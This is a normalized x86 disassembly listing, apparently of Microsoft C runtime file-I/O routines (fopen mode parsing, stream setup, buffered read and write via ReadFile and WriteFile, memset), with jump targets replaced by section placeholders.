xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edx [ ecx + 0x7f ]
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
cmp al bl
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_1001735d
add esp 0x14
test eax eax
je r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_1001772c
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_100175a8
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x8
push r--data
push esi
call sub_100175a8
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push 0x7
push r--data
push esi
call sub_100175a8
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
sub_1000f38a
push 0x10
push r--data
call sub_1000ed24
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_100120e7
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000f4b9
mov eax edi
call sub_1000ed69
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_10015a7d
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_10016a73
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_1000ced5
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_1000f024
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_10012024
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_1000f092
pop ecx
pop ecx
sub_1000f4c4
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_1000f554
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_1001785d
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_1001787c
jmp r-xdata
sub_1000f554
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_1000c0a5
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_1000f4c4
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1000f5b6
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1000f5e6
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000f617
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1000ecdb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_1001787f
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_1000c4bf
pop ecx
push eax
call sub_1000fd04
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_1000c4bf
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_1000c4bf
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_1000c4bf
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1000c4bf
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_1000f742
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_1000ecee
and [ eax ] 0x0
call sub_1000ecdb
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1000ecee
mov [ eax ] ebx
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1000ecee
mov [ eax ] ebx
call sub_1000ecdb
mov [ eax ] 0x9
jmp r-xdata
call sub_1000ecee
mov [ eax ] ebx
call sub_1000ecdb
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000d8e6
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_10015a7d
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_100178c8
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_1000ecdb
mov [ eax ] 0xc
call sub_1000ecee
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_1000ed01
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_1000ced5
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_1000ecdb
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_100178c8
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_100178c8
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_100178c8
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_1000fd04
push 0x10
push r--data
call sub_1000ed24
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_1000ecee
and [ eax ] 0x0
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] esi
call sub_1000ecdb
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_1000ed69
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_1000e645
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_1000ecee
mov [ eax ] esi
call sub_1000ecdb
mov [ eax ] 0x16
jmp r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000f742
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000d8e6
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000fdf7
mov eax [ ebp - 0x1c ]
sub_1000fe10
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_10017abd
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_1000fe8a
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_1000c4bf
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_1000ecdb
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_1000ef0c
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_10010723
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_10017b4c
pop ecx
test eax eax
jne r-xdata
call sub_1000ef0c
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10010723
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1001787f
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_1001794d
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1000fff0
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_10017e00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_1000ecee
mov [ eax ] esi
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000c0a5
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_1000ecee
xor esi esi
mov [ eax ] esi
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10017b4c
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_100178c8
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_10013ee4
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
